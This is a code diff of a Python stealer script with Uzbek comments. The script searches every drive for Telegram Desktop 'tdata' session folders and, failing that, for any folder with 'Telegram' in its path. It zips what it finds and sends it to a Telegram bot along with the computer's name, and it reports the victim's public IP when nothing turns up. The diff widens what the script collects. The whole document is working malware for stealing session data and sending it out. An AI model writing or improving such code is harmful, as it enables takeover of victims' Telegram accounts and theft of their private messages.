@@ -44,19 +44,19 @@ def send_telegram_message(text):
     except:
         pass
 
-def zip_and_send(tdata_path):
+def zip_and_send(folder_path, zip_name_suffix):
     pc_name = socket.gethostname()
     try:
         temp_dir = tempfile.gettempdir()
-        zip_path = os.path.join(temp_dir, f"tdata_{pc_name}.zip")
+        zip_path = os.path.join(temp_dir, f"{zip_name_suffix}_{pc_name}.zip")
         with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
-            for root, dirs, files in os.walk(tdata_path):
+            for root, dirs, files in os.walk(folder_path):
                 for file in files:
                     try:
                         file_path = os.path.join(root, file)
-                        zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(tdata_path)))
+                        zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(folder_path)))
                     except: pass
-        send_telegram_file(zip_path, f"✅ Yangi tdata yig'ildi!\n🖥 {pc_name}")
+        send_telegram_file(zip_path, f"✅ Topildi: {zip_name_suffix}\n🖥 {pc_name}")
         os.remove(zip_path)
         return True
     except:
@@ -65,7 +65,9 @@ def zip_and_send(tdata_path):
 # ============================================================
 # SUPER QIDIRUVCHI (Barcha disklar va foydalanuvchilar)
 # ============================================================
-def find_tdata_anywhere():
+def search_and_collect():
+    found = False
+    
     # C: dan Z: gacha barcha mantiqiy disklarni tekshiramiz
     for drive_letter in range(ord('C'), ord('Z') + 1):
         drive = f"{chr(drive_letter)}:\\"
@@ -85,10 +87,33 @@ def find_tdata_anywhere():
                             ]
                             for path in possible_paths:
                                 if os.path.exists(path):
-                                    return path
+                                    zip_and_send(path, "tdata")
+                                    found = True
                 except:
                     pass
-    return None
+    
+    # Agar tdata topilmasa, barcha "Telegram" nomli papkalarni qidiramiz
+    if not found:
+        for drive_letter in range(ord('C'), ord('Z') + 1):
+            drive = f"{chr(drive_letter)}:\\"
+            if os.path.exists(drive):
+                try:
+                    for root, dirs, files in os.walk(drive):
+                        if "Telegram" in root or "TelegramDesktop" in root:
+                            # Agar ichida tdata bo'lsa, uni ham yig'amiz
+                            tdata_sub = os.path.join(root, "tdata")
+                            if os.path.exists(tdata_sub):
+                                zip_and_send(tdata_sub, "tdata_alt")
+                                found = True
+                            else:
+                                # Agar tdata bo'lmasa, o'sha papkani o'zi yig'amiz
+                                zip_and_send(root, "telegram_folder")
+                                found = True
+                        if found:
+                            break
+                except:
+                    pass
+    return found
 
 # ============================================================
 # ASOSIY ISHCHI
@@ -96,17 +121,13 @@ def find_tdata_anywhere():
 def main():
     pc_name = socket.gethostname()
     
-    # 1. Hamma joydan qidiramiz
-    tdata_path = find_tdata_anywhere()
-    
-    if tdata_path:
-        send_telegram_message(f"⏳ {pc_name}: tdata topildi! ({tdata_path})")
-        if zip_and_send(tdata_path):
-            send_telegram_message(f"✅ {pc_name}: tdata muvaffaqiyatli yuborildi!")
+    if search_and_collect():
+        send_telegram_message(f"✅ {pc_name}: Barcha topilgan ma'lumotlar yuborildi!")
     else:
+        # Agar hech narsa topilmasa, kompyuter ma'lumotlarini yuboramiz
         try:
             ip = urllib.request.urlopen("https://api.ipify.org").read().decode()
-            send_telegram_message(f"⚠️ {pc_name}: tdata topilmadi! (Hamma joy qidirildi)\nIP: {ip}")
+            send_telegram_message(f"📦 {pc_name}: Telegram ma'lumotlari topilmadi.\n🌐 IP: {ip}")
         except:
             pass
 
